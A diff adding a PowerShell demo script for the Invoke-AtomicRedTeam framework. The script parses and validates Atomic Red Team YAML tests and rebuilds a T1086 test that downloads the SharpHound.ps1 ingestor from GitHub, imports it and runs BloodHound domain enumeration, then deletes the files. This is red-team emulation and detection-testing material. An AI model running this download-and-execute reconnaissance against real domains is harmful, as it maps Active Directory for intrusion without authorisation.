@@ -1,0 +1,56 @@
+Import-Module /Users/matt.graeber/Documents/GitHub/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1
+
+# Explore the functions exposed in invoke-atomicredteam
+Get-Command -Module Invoke-AtomicRedTeam
+
+# Path to the 
+$AtomicPath = '/Users/matt.graeber/Documents/GitHub/atomic-red-team/atomics/T1086/T1086.yaml'
+
+# Get the raw YAML
+$T1086 = Get-Content -Path $AtomicPath -Raw
+
+# Parse the YAML, validate against expected atomic technique/test schema and output appropriate PowerShell object.
+$AtomicTechnique = Get-AtomicTechnique -Path $AtomicPath
+
+# Validate all atomics
+Get-ChildItem -Path /Users/matt.graeber/Documents/GitHub/atomic-red-team/atomics/ -Recurse -Include 'T*.yaml' | Get-AtomicTechnique
+
+# Recreate T1086 test #2
+
+$InputArg1 = New-AtomicTestInputArgument -Name internal_domain -Description 'Specify internal domain name to analyze' -Type String -Default 'windomain.local'
+$InputArg2 = New-AtomicTestInputArgument -Name file_path -Description 'File path for SharpHound payload' -Type String -Default 'PathToAtomicsFolder\T1086\src'
+
+$DependencyArgs = @{
+    Description = 'Validate if SharpHound.ps1 is located in #{file_path}.'
+    PrereqCommand = 'if (Test-Path #{file_path}\SharpHound.ps1) {exit 0} else {exit 1}'
+    GetPrereqCommand = 'Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "#{file_path}\SharpHound.ps1"'
+}
+
+$Dependency = New-AtomicTestDependency @DependencyArgs
+
+$TestArgs = @{
+    Name = 'Run BloodHound from local disk'
+    Description = @'
+Upon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.
+
+Successful execution will produce stdout reporting LDAP connection was successful and BloodHound domain enumeration is occurring. Upon completion, final output will be a *BloodHound.zip file.
+'@
+    SupportedPlatforms = 'Windows'
+    ExecutorType = 'PowerShell'
+    ExecutorCommand = @'
+write-host "Import and Execution of SharpHound.ps1 from #{file_path}" -ForegroundColor Cyan
+import-module #{file_path}\SharpHound.ps1; invoke-bloodhound -domain -OutputDirectory #{output_path}    
+'@
+    ExecutorCleanupCommand = @'
+Remove-Item #{file_path}\SharpHound.ps1 -Force
+Remove-Item #{file_path}\*BloodHound.zip -Force  
+'@
+    InputArguments = $InputArg1, $InputArg2
+    DependencyExecutorType = 'PowerShell'
+    Dependencies = $Dependency
+}
+
+$AtomicTest = New-AtomicTest @TestArgs
+
+# Convert the atomic test to raw YAML. Add to existing technique. Profit
+$AtomicTest | ConvertTo-Yaml
